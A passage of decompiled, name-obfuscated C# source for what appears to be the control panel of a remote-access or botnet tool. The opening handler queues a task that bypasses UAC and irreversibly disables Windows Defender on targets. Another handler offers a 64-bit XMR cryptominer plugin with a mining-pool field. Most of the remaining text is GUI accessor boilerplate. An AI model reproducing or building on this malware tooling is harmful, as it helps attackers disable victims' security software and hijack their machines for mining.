        if (MessageBox.Show("This will attempt to gain administrative privileges by means of bypassing UAC on Windows 10 systems and kill Windows Defender.\r\n\r\nWARNING: THIS ACTION IS IRREVERSIBLE!\r\n" + Application.ProductName + " WILL NOT BE ABLE TO RESTORE WINDOWS DEFENDER ONCE KILLED.\r\n\r\nAre you sure you wish to proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.No)
        {
            string expression = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
            if (!Versioned.IsNumeric(expression) | (Conversion.Val(expression) > 1440.0))
            {
                Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                item.Tag = "wd_kill|1";
                item.Text = "Kill Windows Defender";
                item.SubItems.Add("Attempt to kill Windows Defender");
                item.SubItems.Add(Conversions.ToString(Conversion.Val(expression)));
                item.SubItems.Add("0");
                this.vmethod_8().Items.Add(item);
                this.method_20();
            }
        }
    }

    private void method_3(object sender, EventArgs e)
    {
        Interaction.MsgBox("If enabled, the 64-Bit version of the XMR miner will be used, which offers a much higher hashrate.\r\n\r\nNote: This plugin is only supported on 64-Bit editions of Windows.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_4(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_34().Text, "(Optional)", true) == 0)
        {
            this.vmethod_34().Text = string.Empty;
            this.vmethod_34().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_34().Font, FontStyle.Regular);
            this.vmethod_34().Font = font;
        }
    }

    private void method_5(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_34().Text, string.Empty, true) == 0)
        {
            this.vmethod_34().Text = "(Optional)";
            this.vmethod_34().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_34().Font, FontStyle.Italic);
            this.vmethod_34().Font = font;
        }
    }

    private void method_6(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_28().Text, string.Empty, true) == 0)
        {
            this.vmethod_28().Text = "(Optional)";
            this.vmethod_28().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_28().Font, FontStyle.Italic);
            this.vmethod_28().Font = font;
        }
    }

    private void method_7(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_28().Text, "(Optional)", true) == 0)
        {
            this.vmethod_28().Text = string.Empty;
            this.vmethod_28().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_28().Font, FontStyle.Regular);
            this.vmethod_28().Font = font;
        }
    }

    private void method_8(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_66().Text, "example-pool.com:5555", true) == 0)
        {
            this.vmethod_66().Text = string.Empty;
            this.vmethod_66().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_66().Font, FontStyle.Regular);
            this.vmethod_66().Font = font;
        }
    }

    private void method_9(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_66().Text, string.Empty, true) == 0)
        {
            this.vmethod_66().Text = "example-pool.com:5555";
            this.vmethod_66().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_66().Font, FontStyle.Italic);
            this.vmethod_66().Font = font;
        }
    }

    internal virtual TabPage vmethod_0()
    {
        return this.tabPage_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(TabPage tabPage_6)
    {
        this.tabPage_0 = tabPage_6;
    }

    internal virtual Label vmethod_10()
    {
        return this.label_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(Label label_10)
    {
        this.label_0 = label_10;
    }

    internal virtual TextBox vmethod_12()
    {
        return this.textBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(TextBox textBox_6)
    {
        this.textBox_0 = textBox_6;
    }

    internal virtual CheckBox vmethod_14()
    {
        return this.checkBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(CheckBox checkBox_5)
    {
        this.checkBox_0 = checkBox_5;
    }

    internal virtual VisualButton vmethod_16()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(VisualButton visualButton_6)
    {
        EventHandler handler = new EventHandler(this.method_0);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_6;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_18()
    {
        return this.visualButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(VisualButton visualButton_6)
    {
        EventHandler handler = new EventHandler(this.method_1);
        VisualButton button = this.visualButton_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_1 = visualButton_6;
        button = this.visualButton_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual TabPage vmethod_2()
    {
        return this.tabPage_1;
    }

    internal virtual VisualButton vmethod_20()
    {
        return this.visualButton_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(VisualButton visualButton_6)
    {
        EventHandler handler = new EventHandler(this.method_14);
        VisualButton button = this.visualButton_2;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_2 = visualButton_6;
        button = this.visualButton_2;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_22()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_2);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_2;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_24()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_3);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_1 = pictureBox_2;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_26()
    {
        return this.checkBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(CheckBox checkBox_5)
    {
        this.checkBox_1 = checkBox_5;
    }

    internal virtual TextBox vmethod_28()
    {
        return this.textBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(TextBox textBox_6)
    {
        EventHandler handler = new EventHandler(this.method_6);
        EventHandler handler2 = new EventHandler(this.method_7);
        TextBox box = this.textBox_1;
        if (box != null)
        {
            box.LostFocus -= handler;
            box.GotFocus -= handler2;
        }
        this.textBox_1 = textBox_6;
        box = this.textBox_1;
        if (box != null)
        {
            box.LostFocus += handler;
            box.GotFocus += handler2;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(TabPage tabPage_6)
    {
        this.tabPage_1 = tabPage_6;
    }

    internal virtual Label vmethod_30()
    {
        return this.label_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(Label label_10)
    {
        this.label_1 = label_10;
    }

    internal virtual CheckBox vmethod_32()
    {
        return this.checkBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(CheckBox checkBox_5)
    {
        this.checkBox_2 = checkBox_5;
    }

    internal virtual TextBox vmethod_34()
    {
        return this.textBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(TextBox textBox_6)
    {
        EventHandler handler = new EventHandler(this.method_4);
        EventHandler handler2 = new EventHandler(this.method_5);
        TextBox box = this.textBox_2;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
        }
        this.textBox_2 = textBox_6;
        box = this.textBox_2;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
        }
    }

    internal virtual Label vmethod_36()
    {
        return this.label_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(Label label_10)
    {
        this.label_2 = label_10;
    }

    internal virtual ComboBox vmethod_38()
    {
        return this.comboBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(ComboBox comboBox_4)
    {
        this.comboBox_0 = comboBox_4;
    }

    internal virtual TabPage vmethod_4()
    {
        return this.tabPage_2;
    }

    internal virtual Label vmethod_40()
    {
        return this.label_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(Label label_10)
    {
        this.label_3 = label_10;
    }

    internal virtual CheckBox vmethod_42()
    {
        return this.checkBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(CheckBox checkBox_5)
    {
        this.checkBox_3 = checkBox_5;
    }

    internal virtual ComboBox vmethod_44()
    {
        return this.comboBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(ComboBox comboBox_4)
    {
        this.comboBox_1 = comboBox_4;
    }

    internal virtual Label vmethod_46()
    {
        return this.label_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(Label label_10)
    {
        this.label_4 = label_10;
    }

    internal virtual TextBox vmethod_48()
    {
        return this.textBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(TextBox textBox_6)
    {
        EventHandler handler = new EventHandler(this.method_10);
        EventHandler handler2 = new EventHandler(this.method_11);
        TextBox box = this.textBox_3;
        if (box != null)
        {
            box.LostFocus -= handler;
            box.GotFocus -= handler2;
        }
        this.textBox_3 = textBox_6;
        box = this.textBox_3;
        if (box != null)
        {
            box.LostFocus += handler;
            box.GotFocus += handler2;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(TabPage tabPage_6)
    {
        EventHandler handler = new EventHandler(this.method_18);
        TabPage page = this.tabPage_2;
        if (page != null)
        {
            page.Click -= handler;
        }
        this.tabPage_2 = tabPage_6;
        page = this.tabPage_2;
        if (page != null)
        {
            page.Click += handler;
        }
    }

    internal virtual Label vmethod_50()
    {
        return this.label_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(Label label_10)
    {
        this.label_5 = label_10;
    }

    internal virtual CheckBox vmethod_52()
    {
        return this.checkBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(CheckBox checkBox_5)
    {
        this.checkBox_4 = checkBox_5;
    }

    internal virtual ComboBox vmethod_54()
    {
        return this.comboBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(ComboBox comboBox_4)
    {
        this.comboBox_2 = comboBox_4;
    }

    internal virtual Label vmethod_56()
    {
        return this.label_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(Label label_10)
    {
        this.label_6 = label_10;
    }

    internal virtual ComboBox vmethod_58()
    {
        return this.comboBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(ComboBox comboBox_4)
    {
        this.comboBox_3 = comboBox_4;
    }

    internal virtual TabControl vmethod_6()
    {
        return this.tabControl_0;
    }

    internal virtual Label vmethod_60()
    {
        return this.label_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(Label label_10)
    {
        this.label_7 = label_10;
    }

    internal virtual TextBox vmethod_62()
    {
        return this.textBox_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(TextBox textBox_6)
    {
        EventHandler handler = new EventHandler(this.method_12);
        EventHandler handler2 = new EventHandler(this.method_13);
        TextBox box = this.textBox_4;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
        }
        this.textBox_4 = textBox_6;
        box = this.textBox_4;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
        }
    }

    internal virtual Label vmethod_64()
    {
        return this.label_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_65(Label label_10)
    {
        this.label_8 = label_10;
    }

    internal virtual TextBox vmethod_66()
    {
        return this.textBox_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_67(TextBox textBox_6)
    {
        EventHandler handler = new EventHandler(this.method_8);
        EventHandler handler2 = new EventHandler(this.method_9);
        TextBox box = this.textBox_5;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
        }
        this.textBox_5 = textBox_6;
        box = this.textBox_5;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
        }
    }

    internal virtual Label vmethod_68()
    {
        return this.label_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_69(Label label_10)
    {
        this.label_9 = label_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(TabControl tabControl_1)
    {
        this.tabControl_0 = tabControl_1;
    }

    internal virtual ContextMenuStrip vmethod_70()
    {
        return this.contextMenuStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_71(ContextMenuStrip contextMenuStrip_1)
    {
        this.contextMenuStrip_0 = contextMenuStrip_1;
    }

    internal virtual ToolStripMenuItem vmethod_72()
    {
        return this.toolStripMenuItem_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_73(ToolStripMenuItem toolStripMenuItem_5)
    {
        EventHandler handler = new EventHandler(this.method_15);
        ToolStripMenuItem item = this.toolStripMenuItem_0;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_0 = toolStripMenuItem_5;
        item = this.toolStripMenuItem_0;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_74()
    {
        return this.toolStripSeparator_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_75(ToolStripSeparator toolStripSeparator_2)
    {
        this.toolStripSeparator_0 = toolStripSeparator_2;
    }

    internal virtual ToolStripMenuItem vmethod_76()
    {
        return this.toolStripMenuItem_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_77(ToolStripMenuItem toolStripMenuItem_5)
    {
        this.toolStripMenuItem_1 = toolStripMenuItem_5;
    }

    internal virtual ToolStripMenuItem vmethod_78()
    {
        return this.toolStripMenuItem_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_79(ToolStripMenuItem toolStripMenuItem_5)
    {
        EventHandler handler = new EventHandler(this.method_16);
        ToolStripMenuItem item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_2 = toolStripMenuItem_5;
        item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual GClass7 vmethod_8()
    {
        return this.gclass7_0;
    }

    internal virtual ToolStripSeparator vmethod_80()
    {
        return this.toolStripSeparator_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_81(ToolStripSeparator toolStripSeparator_2)
    {
        this.toolStripSeparator_1 = toolStripSeparator_2;
    }

    internal virtual ToolStripMenuItem vmethod_82()
    {
        return this.toolStripMenuItem_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_83(ToolStripMenuItem toolStripMenuItem_5)
    {
        EventHandler handler = new EventHandler(this.method_17);
        ToolStripMenuItem item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_3 = toolStripMenuItem_5;
        item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual TabPage vmethod_84()
    {
        return this.tabPage_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_85(TabPage tabPage_6)
    {
        this.tabPage_3 = tabPage_6;
    }

    internal virtual VisualButton vmethod_86()
    {
        return this.visualButton_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_87(VisualButton visualButton_6)
    {
        EventHandler handler = new EventHandler(this.method_19);
        VisualButton button = this.visualButton_3;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_3 = visualButton_6;
        button = this.visualButton_3;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_88()
    {
        return this.toolStripMenuItem_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_89(ToolStripMenuItem toolStripMenuItem_5)
    {
        EventHandler handler = new EventHandler(this.method_21);
        ToolStripMenuItem item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_4 = toolStripMenuItem_5;
        item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(GClass7 gclass7_1)
    {
        this.gclass7_0 = gclass7_1;
    }

    internal virtual TabPage vmethod_90()
    {
        return this.tabPage_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_91(TabPage tabPage_6)
    {
        this.tabPage_4 = tabPage_6;
    }

    internal virtual VisualButton vmethod_92()
    {
        return this.visualButton_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_93(VisualButton visualButton_6)
    {
        EventHandler handler = new EventHandler(this.method_22);
        VisualButton button = this.visualButton_4;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_4 = visualButton_6;
        button = this.visualButton_4;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual TabPage vmethod_94()
    {
        return this.tabPage_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_95(TabPage tabPage_6)
    {
        this.tabPage_5 = tabPage_6;
    }

    internal virtual VisualButton vmethod_96()
    {
        return this.visualButton_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_97(VisualButton visualButton_6)
    {
        EventHandler handler = new EventHandler(this.method_23);
        VisualButton button = this.visualButton_5;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_5 = visualButton_6;
        button = this.visualButton_5;
        if (button != null)
        {
            button.Click += handler;
        }
    }
}

